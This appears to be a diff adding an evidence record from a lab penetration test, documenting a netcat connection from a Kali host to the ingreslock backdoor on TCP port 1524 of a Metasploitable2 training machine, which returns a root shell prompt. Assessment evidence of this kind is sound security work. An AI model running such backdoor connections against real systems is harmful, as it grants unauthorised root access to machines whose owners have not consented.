@@ -1,0 +1,18 @@
+SecureCorp Security Assessment — Evidence E07
+
+Test: Port 1524 root-shell connection
+Source: Kali Linux (10.10.10.5)
+Target: Metasploitable2 (10.10.10.10)
+Port: TCP 1524
+Command: nc -nv -w 3 10.10.10.10 1524
+
+Observed output:
+1524 (ingreslock) open
+root@metasploitable:/#
+
+Result:
+The connection displayed a root-shell prompt.
+
+Limitations:
+This evidence records the terminal output observed during testing.
+No additional commands were executed within the shell.
